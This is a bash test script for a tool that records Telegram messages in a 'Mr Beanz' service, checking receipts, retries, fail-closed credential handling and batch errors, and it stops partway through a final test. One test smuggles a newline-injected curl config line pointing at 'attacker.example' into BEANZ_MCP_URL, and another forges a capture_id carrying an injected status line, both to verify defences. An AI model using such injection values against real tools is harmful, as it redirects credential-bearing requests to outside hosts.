#!/usr/bin/env bash
# Behavior tests for fm-telegram-brain-capture.sh, the Firstmate-owned path that
# records Telegram payloads in Mr Beanz.
#
# These cases drive the public commands through a fakebin curl and never touch a
# live brain or Telegram. The interrupt adapter is stubbed only for from-result.
set -uo pipefail

# shellcheck source=tests/lib.sh
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

CAPTURE="$ROOT/bin/fm-telegram-brain-capture.sh"
TMP_ROOT=$(fm_test_tmproot fm-telegram-brain-capture)
PYTHON_BIN=$(command -v python3) || fail "test needs python3"
PYTHON_BIN_DIR=$(dirname "$PYTHON_BIN")
BASE_PATH=${FM_TEST_BASE_PATH:-$PYTHON_BIN_DIR:/usr/bin:/bin:/usr/sbin:/sbin}

TOKEN='tok_test_brain_capture_secret'
CAPTAIN_CHAT=4242
CAPTAIN_USER=909

make_home() {
  local name=$1 home
  home="$TMP_ROOT/$name"
  mkdir -p "$home/state" "$home/config" "$home/secrets"
  umask 077
  cat > "$home/secrets/mcp.env" <<EOF
BEANZ_MCP_TOKEN=$TOKEN
BEANZ_MCP_URL=https://brain.test
EOF
  chmod 600 "$home/secrets/mcp.env"
  printf '%s\n' "$home"
}

payload() {
  local update_id=$1 text=$2 chat_id=${3:-$CAPTAIN_CHAT} from_id=${4:-$CAPTAIN_USER}
  printf '{"chat_id":%s,"date":1700000000,"from_id":%s,"text":%s,"update_id":%s}\n' \
    "$chat_id" "$from_id" "$(python3 -c 'import json,sys; print(json.dumps(sys.argv[1]))' "$text")" "$update_id"
}

make_fake_curl() {
  local home=$1 fakebin
  fakebin=$(fm_fakebin "$home")
  cat > "$fakebin/curl" <<'SH'
#!/usr/bin/env bash
ofile="" argv=$*
config=""
while [ $# -gt 0 ]; do
  case "$1" in
    -o) ofile=$2; shift 2 ;;
    -w|--max-time) shift 2 ;;
    -K)
      if [ "$2" = - ]; then
        config=$(cat)
      fi
      shift 2
      ;;
    -s) shift ;;
    *) shift ;;
  esac
done
url="" bodyfile=""
while IFS= read -r line; do
  case "$line" in
    'url = '*) url=${line#url = } ; url=${url#\"} ; url=${url%\"} ;;
    'data-binary = '*)
      bodyfile=${line#data-binary = }
      bodyfile=${bodyfile#\"@}
      bodyfile=${bodyfile%\"}
      ;;
  esac
done <<EOF
$config
EOF
code=${FAKE_CAPTURE_CODE:-200}
if [ -n "${FAKE_CAPTURE_FAIL_MATCH:-}" ] && [ -n "$bodyfile" ] \
  && grep -q -F -- "$FAKE_CAPTURE_FAIL_MATCH" "$bodyfile"; then
  code=${FAKE_CAPTURE_FAIL_CODE:-500}
fi
if [ -n "${FAKE_CURL_LOG:-}" ]; then
  {
    echo "argv=$argv"
    echo "url=$url"
  } >> "$FAKE_CURL_LOG"
fi
if [ -n "$ofile" ]; then
  body=${FAKE_CAPTURE_BODY-}
  if [ -z "$body" ]; then
    body='{"capture_id":"cap-1","status":"captured"}'
  fi
  printf '%s' "$body" > "$ofile"
fi
printf '%s' "$code"
exit "${FAKE_CURL_EXIT:-0}"
SH
  chmod +x "$fakebin/curl"
  printf '%s\n' "$fakebin"
}

make_stub_adapter() {
  local home=$1 kind=$2
  {
    printf '%s\n' '#!/usr/bin/env bash'
    printf '%s\n' "[ \"\$2\" = \"$home/result\" ] || exit 3"
    # shellcheck disable=SC2016 # $1 belongs to the stub adapter, not this test.
    printf '%s\n' 'case "$1" in'
    printf '%s\n' "  classify) printf '%s\\n' $(printf '%q' "$kind"); exit 0 ;;"
    printf '%s\n' "  messages) printf 'adapter-messages-ran\\n' >> $(printf '%q' "$home/messages.calls"); cat -- $(printf '%q' "$home/messages.jsonl") ;;"
    printf '%s\n' '  *) exit 2 ;;'
    printf '%s\n' 'esac'
  } > "$home/bin/fm-procevent-telegram.sh"
  chmod +x "$home/bin/fm-procevent-telegram.sh"
}

run_capture() {
  local home=$1
  shift
  PATH="$1:$BASE_PATH" \
    FM_HOME="$home" \
    FM_STATE_OVERRIDE="$home/state" \
    FM_CONFIG_OVERRIDE="$home/config" \
    FM_BEANZ_ENV_FILE="$home/secrets/mcp.env" \
    FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
    FAKE_CURL_LOG="${FAKE_CURL_LOG-}" \
    FAKE_CAPTURE_BODY="${FAKE_CAPTURE_BODY-}" \
    FAKE_CAPTURE_CODE="${FAKE_CAPTURE_CODE-}" \
    FAKE_CAPTURE_FAIL_MATCH="${FAKE_CAPTURE_FAIL_MATCH-}" \
    FAKE_CAPTURE_FAIL_CODE="${FAKE_CAPTURE_FAIL_CODE-}" \
    FAKE_CURL_EXIT="${FAKE_CURL_EXIT-}" \
    FM_TELEGRAM_BRAIN_CAPTURE_GROUP="${FM_TELEGRAM_BRAIN_CAPTURE_GROUP-}" \
    FM_TELEGRAM_BRAIN_CAPTURE_FAILPOINT="${FM_TELEGRAM_BRAIN_CAPTURE_FAILPOINT-}" \
    "$CAPTURE" "${@:2}"
}

home=$(make_home base)
fakebin=$(make_fake_curl "$home")

# --- captain payload is posted and receipted --------------------------------
log="$home/curl.log"
FAKE_CURL_LOG=$log
out=$(payload 1001 "remember the homestay partner" | run_capture "$home" "$fakebin" capture -)
expect_code 0 $? "captain capture should succeed"
assert_contains "$out" "captured 1001 cap-1" "captain capture did not report the capture_id"
assert_present "$home/state/telegram-brain-capture/1001" "captain capture wrote no receipt"
assert_grep 'url=https://brain.test/v1/capture' "$log" "captain capture did not POST to /v1/capture"
assert_no_grep "$TOKEN" "$log" "brain token leaked into curl argv"
assert_no_grep "$TOKEN" "$home/state/telegram-brain-capture/1001" "brain token leaked into the receipt"
pass "a captain Telegram payload is posted to Mr Beanz and receipted"

# --- retry is idempotent ----------------------------------------------------
log2="$home/curl.retry.log"
FAKE_CURL_LOG=$log2
out=$(payload 1001 "remember the homestay partner" | run_capture "$home" "$fakebin" capture -)
expect_code 0 $? "retry should succeed"
assert_contains "$out" "already-captured 1001 cap-1" "retry did not reuse the receipt"
assert_absent "$log2" "retry posted to the brain again"
pass "a matching receipt skips a second brain write"

# --- failed brain write leaves no receipt -----------------------------------
fail_home=$(make_home fail)
fail_bin=$(make_fake_curl "$fail_home")
FAKE_CAPTURE_CODE=200
FAKE_CAPTURE_BODY='{"status":"captured"}'
FAKE_CURL_LOG="$fail_home/curl.log"
if payload 2002 "do not lose this" | run_capture "$fail_home" "$fail_bin" capture - >/dev/null 2>"$fail_home/err"; then
  fail "a 200 without capture_id must fail"
fi
assert_absent "$fail_home/state/telegram-brain-capture/2002" \
  "a failed brain write still wrote a receipt"
assert_grep "no capture_id" "$fail_home/err" "missing capture_id was not reported"
pass "HTTP 200 without capture_id writes no receipt"

# --- group payloads are skipped while the flag is off -----------------------
group_home=$(make_home group-off)
group_bin=$(make_fake_curl "$group_home")
FAKE_CURL_LOG="$group_home/curl.log"
FAKE_CAPTURE_BODY='{"capture_id":"cap-group","status":"captured"}'
FAKE_CAPTURE_CODE=200
out=$(payload 3003 "group chatter" -100123 "$CAPTAIN_USER" | run_capture "$group_home" "$group_bin" capture -)
expect_code 0 $? "skipped group payload should succeed"
assert_contains "$out" "skipped:group 3003" "group payload was not skipped"
assert_absent "$group_home/curl.log" "group skip still posted to the brain"
assert_absent "$group_home/state/telegram-brain-capture/3003" "group skip wrote a receipt"
pass "group discussion is skipped while the flag is off"

# --- group payloads are captured when the flag is on ------------------------
group_on=$(make_home group-on)
printf 'on\n' > "$group_on/config/telegram-brain-capture-group"
group_on_bin=$(make_fake_curl "$group_on")
FAKE_CURL_LOG="$group_on/curl.log"
FAKE_CAPTURE_BODY='{"capture_id":"cap-on","status":"captured"}'
FAKE_CAPTURE_CODE=200
out=$(payload 3004 "group decision" -100123 "$CAPTAIN_USER" | run_capture "$group_on" "$group_on_bin" capture -)
expect_code 0 $? "enabled group capture should succeed"
assert_contains "$out" "captured 3004 cap-on" "enabled group capture did not post"
assert_grep '"source":"firstmate-telegram-group"' "$group_on/state/telegram-brain-capture/3004" \
  "group receipt did not record the group source"
pass "group discussion is captured when the flag is on"

# --- an unconfigured brain skips without a network call ---------------------
nocred=$(make_home nocred)
rm -f "$nocred/secrets/mcp.env"
nocred_bin=$(make_fake_curl "$nocred")
out=$(payload 4004 "should not send" | \
  PATH="$nocred_bin:$BASE_PATH" FM_HOME="$nocred" \
  FM_STATE_OVERRIDE="$nocred/state" \
  FM_CONFIG_OVERRIDE="$nocred/config" \
  FM_BEANZ_ENV_FILE="$nocred/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  FAKE_CURL_LOG="$nocred/curl.log" \
  "$CAPTURE" capture -)
expect_code 0 $? "an unconfigured brain must stay acknowledgeable"
assert_contains "$out" "capture-unconfigured brain-credentials" \
  "an unconfigured brain did not name the missing configuration"
assert_absent "$nocred/curl.log" "an unconfigured brain still called curl"
assert_absent "$nocred/state/telegram-brain-capture/4004" "an unconfigured brain wrote a receipt"
pass "an absent credential file skips with a zero exit and no network call"

# --- an unconfigured captain chat id skips too ------------------------------
nochat=$(make_home nochat)
nochat_bin=$(make_fake_curl "$nochat")
out=$(payload 4005 "should not send" | \
  PATH="$nochat_bin:$BASE_PATH" FM_HOME="$nochat" \
  FM_STATE_OVERRIDE="$nochat/state" \
  FM_CONFIG_OVERRIDE="$nochat/config" \
  FM_BEANZ_ENV_FILE="$nochat/secrets/mcp.env" \
  FM_TELEGRAM_ENV_FILE="$nochat/secrets/telegram.env" \
  FAKE_CURL_LOG="$nochat/curl.log" \
  "$CAPTURE" capture -)
expect_code 0 $? "an unconfigured captain chat id must stay acknowledgeable"
assert_contains "$out" "capture-unconfigured captain-chat" \
  "an absent captain chat id did not name the missing configuration"
assert_absent "$nochat/curl.log" "an absent captain chat id still called curl"
pass "an absent captain chat id skips with a zero exit and no network call"

# --- a present but unusable credential file still refuses -------------------
brokencred=$(make_home broken-cred)
brokencred_bin=$(make_fake_curl "$brokencred")
umask 077
printf '%s\n' 'BEANZ_MCP_URL=https://brain.test' > "$brokencred/secrets/mcp.env"
chmod 600 "$brokencred/secrets/mcp.env"
FAKE_CURL_LOG="$brokencred/curl.log"
if payload 4006 "should not send" | \
  run_capture "$brokencred" "$brokencred_bin" capture - >/dev/null 2>"$brokencred/err"; then
  fail "a credential file without a token must refuse"
fi
assert_grep "BEANZ_MCP_TOKEN is missing" "$brokencred/err" "a tokenless credential file was not reported"
assert_absent "$brokencred/curl.log" "a tokenless credential file still called curl"
pass "a present but unusable credential file stays fail-closed"

# --- boolean update ids are rejected ----------------------------------------
bad=$(make_home bool)
bad_bin=$(make_fake_curl "$bad")
FAKE_CURL_LOG="$bad/curl.log"
out=$(printf '{"update_id":true,"text":"x","chat_id":4242,"from_id":909}\n' | \
  run_capture "$bad" "$bad_bin" capture -)
expect_code 0 $? "a rejected payload shape should not fail the run"
assert_contains "$out" "skipped:unsupported - update_id is not an integer" \
  "boolean update_id was accepted"
assert_absent "$bad/curl.log" "a boolean update_id was posted to the brain"
pass "boolean update ids are skipped as unsupported"

# --- from-result uses the interrupt adapter's messages command --------------
from_home=$(make_home from-result)
from_bin=$(make_fake_curl "$from_home")
mkdir -p "$from_home/bin"
payload 5005 "from the adapter" > "$from_home/messages.jsonl"
make_stub_adapter "$from_home" message
printf 'notice\n' > "$from_home/result"
FAKE_CURL_LOG="$from_home/curl.log"
FAKE_CAPTURE_BODY='{"capture_id":"cap-from","status":"captured"}'
out=$(PATH="$from_home/bin:$from_bin:$BASE_PATH" \
  FM_HOME="$from_home" \
  FM_STATE_OVERRIDE="$from_home/state" \
  FM_CONFIG_OVERRIDE="$from_home/config" \
  FM_BEANZ_ENV_FILE="$from_home/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  FAKE_CURL_LOG="$from_home/curl.log" \
  FAKE_CAPTURE_BODY='{"capture_id":"cap-from","status":"captured"}' \
  "$CAPTURE" from-result "$from_home/result")
expect_code 0 $? "from-result should succeed"
assert_contains "$out" "captured 5005 cap-from" "from-result did not capture adapter payloads"
pass "from-result captures payloads from the interrupt adapter"

# --- from-result refuses when the interrupt adapter is absent ---------------
no_adapter=$(make_home no-adapter)
no_adapter_bin=$(make_fake_curl "$no_adapter")
if PATH="$no_adapter_bin:$BASE_PATH" \
  FM_HOME="$no_adapter" \
  FM_STATE_OVERRIDE="$no_adapter/state" \
  FM_CONFIG_OVERRIDE="$no_adapter/config" \
  FM_BEANZ_ENV_FILE="$no_adapter/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  "$CAPTURE" from-result "$no_adapter/result" >/dev/null 2>"$no_adapter/err"; then
  fail "from-result must refuse without the interrupt adapter"
fi
assert_grep "telegram interrupt adapter is not in this checkout" "$no_adapter/err" \
  "missing adapter was not reported"
pass "from-result refuses when the interrupt adapter is absent"

# --- crash before receipt can retry the write -------------------------------
crash=$(make_home crash)
crash_bin=$(make_fake_curl "$crash")
FAKE_CURL_LOG="$crash/curl.log"
FAKE_CAPTURE_BODY='{"capture_id":"cap-crash","status":"captured"}'
FAKE_CAPTURE_CODE=200
set +e
payload 6006 "crash window" | \
  FM_TELEGRAM_BRAIN_CAPTURE_FAILPOINT=before-receipt \
  run_capture "$crash" "$crash_bin" capture - >/dev/null 2>"$crash/err"
crash_rc=$?
expect_code 91 "$crash_rc" "failpoint should exit 91"
assert_absent "$crash/state/telegram-brain-capture/6006" "failpoint still wrote a receipt"
FAKE_CURL_LOG="$crash/curl.retry.log"
unset FM_TELEGRAM_BRAIN_CAPTURE_FAILPOINT
out=$(payload 6006 "crash window" | run_capture "$crash" "$crash_bin" capture -)
expect_code 0 $? "retry after failpoint should succeed"
assert_contains "$out" "captured 6006 cap-crash" "retry after failpoint did not capture"
assert_present "$crash/curl.retry.log" "retry after failpoint skipped the POST"
pass "a crash before the receipt can still write on retry"

# --- a non-message result is a zero-exit no-op ------------------------------
blocked=$(make_home blocked-result)
blocked_bin=$(make_fake_curl "$blocked")
mkdir -p "$blocked/bin"
payload 5006 "must not be captured" > "$blocked/messages.jsonl"
make_stub_adapter "$blocked" blocked
printf 'notice\n' > "$blocked/result"
out=$(PATH="$blocked/bin:$blocked_bin:$BASE_PATH" \
  FM_HOME="$blocked" \
  FM_STATE_OVERRIDE="$blocked/state" \
  FM_CONFIG_OVERRIDE="$blocked/config" \
  FM_BEANZ_ENV_FILE="$blocked/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  FAKE_CURL_LOG="$blocked/curl.log" \
  "$CAPTURE" from-result "$blocked/result")
expect_code 0 $? "a blocked result must stay acknowledgeable with a zero exit"
assert_contains "$out" "no-messages blocked" "the no-op did not name the classification"
assert_absent "$blocked/messages.calls" "a blocked result still asked for messages"
assert_absent "$blocked/curl.log" "a blocked result still posted to the brain"
pass "a result naming no message payloads is a zero-exit no-op"

# --- an ambient BEANZ_MCP_URL never redirects the write ---------------------
amb=$(make_home ambient-url)
amb_bin=$(make_fake_curl "$amb")
out=$(payload 7007 "stays on the credential destination" | \
  PATH="$amb_bin:$BASE_PATH" \
  FM_HOME="$amb" \
  FM_STATE_OVERRIDE="$amb/state" \
  FM_CONFIG_OVERRIDE="$amb/config" \
  FM_BEANZ_ENV_FILE="$amb/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  FAKE_CURL_LOG="$amb/curl.log" \
  BEANZ_MCP_URL=$'https://brain.test\nurl = "https://attacker.example/v1/capture"' \
  "$CAPTURE" capture -)
expect_code 0 $? "an ambient BEANZ_MCP_URL should not break the capture"
assert_contains "$out" "captured 7007 cap-1" "ambient-url capture did not succeed"
assert_grep 'url=https://brain.test/v1/capture' "$amb/curl.log" "capture left the credential destination"
assert_no_grep "attacker.example" "$amb/curl.log" "an ambient BEANZ_MCP_URL redirected the brain write"
pass "an ambient BEANZ_MCP_URL cannot redirect a token-bearing write"

# --- an unsafe credential BEANZ_MCP_URL is refused --------------------------
badurl=$(make_home bad-url)
badurl_bin=$(make_fake_curl "$badurl")
umask 077
printf '%s\n' "BEANZ_MCP_TOKEN=$TOKEN" > "$badurl/secrets/mcp.env"
printf '%s\n' 'BEANZ_MCP_URL="https://brain.test/x y"' >> "$badurl/secrets/mcp.env"
chmod 600 "$badurl/secrets/mcp.env"
FAKE_CURL_LOG="$badurl/curl.log"
if payload 7008 "should not send" | \
  run_capture "$badurl" "$badurl_bin" capture - >/dev/null 2>"$badurl/err"; then
  fail "an unsafe BEANZ_MCP_URL must be refused"
fi
assert_grep "not a plain https URL" "$badurl/err" "unsafe BEANZ_MCP_URL was not reported"
assert_absent "$badurl/curl.log" "unsafe BEANZ_MCP_URL still called curl"
pass "an unsafe credential BEANZ_MCP_URL is refused before the write"

# --- an unreadable group flag reports an error line -------------------------
badflag=$(make_home bad-group-flag)
badflag_bin=$(make_fake_curl "$badflag")
printf 'on\n' > "$badflag/config/telegram-brain-capture-group"
chmod 000 "$badflag/config/telegram-brain-capture-group"
if [ -r "$badflag/config/telegram-brain-capture-group" ]; then
  printf 'skip: running as a user that ignores mode 000\n'
else
  set +e
  PATH="$badflag_bin:$BASE_PATH" \
    FM_HOME="$badflag" \
    FM_STATE_OVERRIDE="$badflag/state" \
    FM_CONFIG_OVERRIDE="$badflag/config" \
    FM_BEANZ_ENV_FILE="$badflag/secrets/mcp.env" \
    FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
    "$CAPTURE" doctor >/dev/null 2>"$badflag/err"
  badflag_rc=$?
  expect_code 1 "$badflag_rc" "an unreadable group flag should exit 1"
  assert_grep "error: cannot read telegram-brain-capture-group" "$badflag/err" \
    "an unreadable group flag did not print an error line"
  assert_no_grep "Traceback" "$badflag/err" "an unreadable group flag printed a traceback"
  pass "an unreadable group flag reports an error line instead of a traceback"
fi
chmod 600 "$badflag/config/telegram-brain-capture-group"

# --- from-result on an unconfigured brain still exits zero ------------------
unconf=$(make_home from-result-unconfigured)
unconf_bin=$(make_fake_curl "$unconf")
mkdir -p "$unconf/bin"
payload 5007 "captain interrupt" > "$unconf/messages.jsonl"
make_stub_adapter "$unconf" message
printf 'notice\n' > "$unconf/result"
rm -f "$unconf/secrets/mcp.env"
out=$(PATH="$unconf/bin:$unconf_bin:$BASE_PATH" \
  FM_HOME="$unconf" \
  FM_STATE_OVERRIDE="$unconf/state" \
  FM_CONFIG_OVERRIDE="$unconf/config" \
  FM_BEANZ_ENV_FILE="$unconf/secrets/mcp.env" \
  FM_TELEGRAM_CAPTAIN_CHAT_ID="$CAPTAIN_CHAT" \
  FAKE_CURL_LOG="$unconf/curl.log" \
  "$CAPTURE" from-result "$unconf/result")
expect_code 0 $? "a message result on an unconfigured brain must stay acknowledgeable"
assert_contains "$out" "capture-unconfigured brain-credentials" \
  "from-result did not report the unconfigured brain"
assert_absent "$unconf/curl.log" "from-result posted with no credentials"
pass "a message result on an unconfigured brain exits zero without a write"

# --- a forged capture_id is refused before it reaches stdout ----------------
forged=$(make_home forged-capture-id)
forged_bin=$(make_fake_curl "$forged")
FAKE_CURL_LOG="$forged/curl.log"
FAKE_CAPTURE_CODE=200
FAKE_CAPTURE_BODY=$'{"capture_id":"cap-1\\nno-messages blocked","status":"captured"}'
if payload 8008 "forged response" | \
  run_capture "$forged" "$forged_bin" capture - >"$forged/out" 2>"$forged/err"; then
  fail "a capture_id carrying a newline must be refused"
fi
assert_grep "control bytes" "$forged/err" "a forged capture_id was not reported"
assert_no_grep "no-messages blocked" "$forged/out" "a forged capture_id reached stdout"
assert_absent "$forged/state/telegram-brain-capture/8008" "a forged capture_id was receipted"
FAKE_CAPTURE_BODY=
pass "a capture_id carrying control bytes never reaches stdout or a receipt"

# --- one bad line never blocks the rest of the batch ------------------------
batch=$(make_home batch)
batch_bin=$(make_fake_curl "$batch")
FAKE_CURL_LOG="$batch/curl.log"
FAKE_CAPTURE_CODE=200
FAKE_CAPTURE_BODY=
{
  payload 9101 "first valid"
  printf '{"chat_id":%s,"date":1,"from_id":%s,"update_id":9102}\n' "$CAPTAIN_CHAT" "$CAPTAIN_USER"
  payload 9103 "third valid"
} > "$batch/batch.jsonl"
out=$(run_capture "$batch" "$batch_bin" capture - < "$batch/batch.jsonl")
expect_code 0 $? "a canonical-shape rejection must not fail the batch"
assert_contains "$out" "captured 9101 cap-1" "the first valid payload was not captured"
assert_contains "$out" "skipped:unsupported 9102 text is not a nonempty string" \
  "the text-less payload was not reported as an unsupported skip"
assert_contains "$out" "captured 9103 cap-1" "a later valid payload was dropped by an earlier bad line"
assert_present "$batch/state/telegram-brain-capture/9103" "a later valid payload was never receipted"
assert_absent "$batch/state/telegram-brain-capture/9102" "an unsupported payload was receipted"
pass "an uncapturable payload is skipped without dropping later valid ones"

# --- a failed write stops the batch instead of retrying every payload -------
wfail=$(make_home write-fail)
wfail_bin=$(make_fake_curl "$wfail")
FAKE_CURL_LOG="$wfail/curl.log"
FAKE_CAPTURE_FAIL_MATCH="brain says no"
{
  payload 9201 "brain says no"
  payload 9202 "brain says yes"
  payload 9203 "brain says yes again"
} > "$wfail/batch.jsonl"
if run_capture "$wfail" "$wfail_bin" capture - < "$wfail/batch.jsonl" >"$wfail/out" 2>"$wfail/err"; then
  fail "a failed brain write must stay fail-closed"
fi
FAKE_CAPTURE_FAIL_MATCH=
assert_grep "HTTP 500" "$wfail/err" "the failed write was not reported"
assert_absent "$wfail/state/telegram-brain-capture/9201" "the failed write left a receipt"
assert_grep "unattempted 2" "$wfail/out" "the unattempted remainder was not reported"
assert_absent "$wfail/state/telegram-brain-capture/9202" "a payload after the failure was still posted"
assert_absent "$wfail/state/telegram-brain-capture/9203" "a payload after the failure was still posted"
wfail_posts=$(grep -c '^url=' "$wfail/curl.log")
expect_code 1 "$wfail_posts" "a failed write kept POSTing the rest of the batch"
pass "a failed brain write stops the batch and reports the unattempted remainder"

# --- the retry after a brain outage captures the remainder ------------------
FAKE_CURL_LOG="$wfail/curl.retry.log"
out=$(run_capture "$wfail" "$wfail_bin" capture - < "$wfail/batch.jsonl")
expect_code 0 $? "the retry after a recovered brain should succeed"
assert_contains "$out" "captured 9201 cap-1" "the retry did not capture the failed payload"
assert_contains "$out" "captured 9203 cap-1" "the retry did not capture the unattempted remainder"
assert_present "$wfail/state/telegram-brain-capture/9202" "the retry left a payload uncaptured"
pass "the retry a missing Telegram ack guarantees captures the whole batch"

# --- a Unicode line separator inside text never shreds a payload ------------
sep=$(make_home line-separator)
sep_bin=$(make_fake_curl "$sep")
FAKE_CURL_LOG="$sep/curl.log"
python3 - "$sep/batch.jsonl" <<'PY_SEP'
import json, sys
payload = {
    "chat_id": 4242,
    "date": 1700000000,
    "from_id": 909,
    "text": "buy milk\u2028and eggs\u2029today\u0085please",
    "update_id": 9701,
}
with open(sys.argv[1], "w", encoding="utf-8") as handle:
    handle.write(json.dumps(payload, ensure_ascii=False) + "\n")
PY_SEP
out=$(run_capture "$sep" "$sep_bin" capture - < "$sep/batch.jsonl")
expect_code 0 $? "a payload carrying U+2028 should capture"
assert_contains "$out" "captured 9701 cap-1" "a Unicode line separator shredded the payload"
assert_not_contains "$out" "skipped:unsupported" "a Unicode line separator was treated as a record break"
assert_present "$sep/state/telegram-brain-capture/9701" "a payload carrying U+2028 was never receipted"
pass "U+2028, U+2029 and U+0085 inside text do not end a record"

# --- a dangling credential symlink is unusable, not unconfigured ------------
dangle=$(make_home dangling-cred)
dangle_bin=$(make_fake_curl "$dangle")
rm -f "$dangle/secrets/mcp.env"
ln -s "$dangle/secrets/never-mounted/mcp.env" "$dangle/secrets/mcp.env"
FAKE_CURL_LOG="$dangle/curl.log"
if payload 9801 "must not be silently dropped" | \
  run_capture "$dangle" "$dangle_bin" capture - >"$dangle/out" 2>"$dangle/err"; then
  fail "a dangling credential symlink must stay fail-closed"
fi
assert_not_contains "$(cat "$dangle/out")" "capture-unconfigured" \
  "a present but unusable credential file was treated as never configured"
assert_absent "$dangle/curl.log" "a dangling credential symlink still called curl"
assert_absent "$dangle/state/telegram-brain-capture/9801" "a dangling credential symlink wrote a receipt"
pass "a dangling credential symlink is an operator fault, not an unconfigured home"

# --- the receipt digest ignores the optional date ---------------------------
datedrift=$(make_home date-drift)
datedrift_bin=$(make_fake_curl "$datedrift")
FAKE_CURL_LOG="$datedrift/curl.log"
out=$(payload 9901 "the same thought" | run_capture "$datedrift" "$datedrift_bin" capture -)
expect_code 0 $? "the first capture should succeed"
assert_contains "$out" "captured 9901 cap-1" "the first capture did not report the capture_id"
out=$(printf '{"chat_id":%s,"from_id":%s,"text":"the same thought","update_id":9901}\n' \
  "$CAPTAIN_CHAT" "$CAPTAIN_USER" | run_capture "$datedrift" "$datedrift_bin" capture -)
expect_code 0 $? "the same thought without a date must not disagree with its receipt"
assert_contains "$out" "already-captured 9901 cap-1" "a dropped date was read as a receipt mismatch"
pass "the receipt digest survives the optional date appearing or disappearing"

# --- a receipt mismatch fails its line without blocking the rest ------------
tamper=$(make_home receipt-tamper)
tamper_bin=$(make_fake_curl "$tamper")
FAKE_CURL_LOG="$tamper/curl.log"
out=$(payload 9902 "the original thought" | run_capture "$tamper" "$tamper_bin" capture -)
expect_code 0 $? "the original capture should succeed"
{
  payload 9902 "a different thought"
  payload 9903 "a later thought"
  payload 9904 "a last thought"
} > "$tamper/batch.jsonl"
if run_capture "$tamper" "$tamper_bin" capture - < "$tamper/batch.jsonl" \
  >"$tamper/out" 2>"$tamper/err"; then
  fail "a receipt content mismatch must stay fail-closed"
fi
assert_grep "disagrees with the payload" "$tamper/err" "the receipt mismatch was not reported"
assert_not_contains "$(cat "$tamper/out")" "unattempted" \
  "a single-update refusal stopped the batch"
assert_present "$tamper/state/telegram-brain-capture/9903" \
  "a receipt mismatch blocked a later payload"
assert_present "$tamper/state/telegram-brain-capture/9904" \
  "a receipt mismatch blocked a later payload"
pass "a refusal scoped to one update_id fails its line, keeps walking, and exits non-zero"

# --- an unread field never costs a capturable message -----------------------
extra=$(make_home extra-fields)
extra_bin=$(make_fake_curl "$extra")
FAKE_CURL_LOG="$extra/curl.log"
out=$(printf '%s\n' \
  '{"chat_id":4242,"date":"2026-08-25T10:00:00Z","from_id":909,"text":"buy the homestay","update_id":9905,"edit_date":true}' | \
  run_capture "$extra" "$extra_bin" capture -)
expect_code 0 $? "an unread field should not fail the run"
assert_contains "$out" "captured 9905 cap-1" "a field this path never reads dropped the message"
assert_not_contains "$out" "skipped:unsupported" "an unread field was treated as a shape rejection"
assert_present "$extra/state/telegram-brain-capture/9905" "the message was never receipted"
pass "fields this path never reads, including date, are ignored not typed"

# --- a payload-scoped 4xx fails its line without blocking the rest ----------
reject=$(make_home payload-reject)
reject_bin=$(make_fake_curl "$reject")
FAKE_CURL_LOG="$reject/curl.log"
FAKE_CAPTURE_FAIL_MATCH="the brain refuses this one"
FAKE_CAPTURE_FAIL_CODE=400
{
  payload 9920 "the brain refuses this one"
  payload 9921 "a later thought"
  payload 9922 "a last thought"
} > "$reject/batch.jsonl"
if run_capture "$reject" "$reject_bin" capture - < "$reject/batch.jsonl" \
  >"$reject/out" 2>"$reject/err"; then
  fail "a rejected message must stay fail-closed"
fi
FAKE_CAPTURE_FAIL_MATCH=
FAKE_CAPTURE_FAIL_CODE=
assert_grep "HTTP 400" "$reject/err" "the rejected message was not reported"
assert_absent "$reject/state/telegram-brain-capture/9920" "the rejected message left a receipt"
assert_not_contains "$(cat "$reject/out")" "unattempted" \
  "a payload-scoped rejection stopped the batch"
assert_present "$reject/state/telegram-brain-capture/9921" \
  "a payload-scoped rejection blocked a later payload"
assert_present "$reject/state/telegram-brain-capture/9922" \
  "a payload-scoped rejection blocked a later payload"
pass "a 4xx confined to one message fails its line, keeps walking, and exits non-zero"

# --- an endpoint-level 404 is systemic and stops the batch ------------------
gone=$(make_home http-gone)
gone_bin=$(make_fake_curl "$gone")
FAKE_CURL_LOG="$gone/curl.log"
FAKE_CAPTURE_CODE=404
{
  payload 9950 "no endpoint here"
  payload 9951 "a later thought"
  payload 9952 "a last thought"
} > "$gone/batch.jsonl"
if run_capture "$gone" "$gone_bin" capture - < "$gone/batch.jsonl" \
  >"$gone/out" 2>"$gone/err"; then
  fail "a missing capture endpoint must stay fail-closed"
fi
FAKE_CAPTURE_CODE=
assert_grep "HTTP 404" "$gone/err" "the missing endpoint was not reported"
assert_grep "unattempted 2" "$gone/out" "an endpoint-level 404 was blamed on one message"
gone_posts=$(grep -c '^url=' "$gone/curl.log")
expect_code 1 "$gone_posts" "a missing endpoint kept POSTing the rest of the batch"
pass "an endpoint-level 404 stops the batch instead of blaming one message"

# --- a 2xx other than 200 is a successful capture ---------------------------
created=$(make_home http-created)
created_bin=$(make_fake_curl "$created")
FAKE_CURL_LOG="$created/curl.log"
FAKE_CAPTURE_CODE=201
out=$(payload 9960 "accepted for creation" | run_capture "$created" "$created_bin" capture -)
expect_code 0 $? "a 201 carrying a capture_id should succeed"
FAKE_CAPTURE_CODE=
assert_contains "$out" "captured 9960 cap-1" "a 201 was not read as a successful capture"
assert_present "$created/state/telegram-brain-capture/9960" "a 201 wrote no receipt"
pass "any 2xx carrying a usable capture_id is a successful capture"

# --- a per-line refusal names the payload that failed -----------------------
named=$(make_home named-refusal)
named_bin=$(make_fake_curl "$named")
FAKE_CURL_LOG="$named/curl.log"
out=$(payload 9970 "the first thought" | run_capture "$named" "$named_bin" capture -)
expect_code 0 $? "the original capture should succeed"
chmod 644 "$named/state/telegram-brain-capture/9970"
{
  payload 9970 "the first thought"
  payload 9971 "a later thought"
} > "$named/batch.jsonl"
